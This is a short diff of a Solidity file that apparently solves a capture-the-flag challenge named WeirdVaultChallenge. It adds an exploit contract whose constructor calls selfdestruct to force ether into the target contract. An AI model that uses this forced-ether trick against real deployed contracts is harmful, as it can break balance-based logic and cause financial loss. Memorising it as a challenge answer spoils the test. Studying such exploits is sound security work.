@@ -13,3 +13,9 @@ contract WeirdVaultChallenge {
         isSolved = true;
     }
 }
+
+contract WeirdVaultChallengeExploit {
+    constructor(address payable target) payable {
+        selfdestruct(target);
+    }
+}
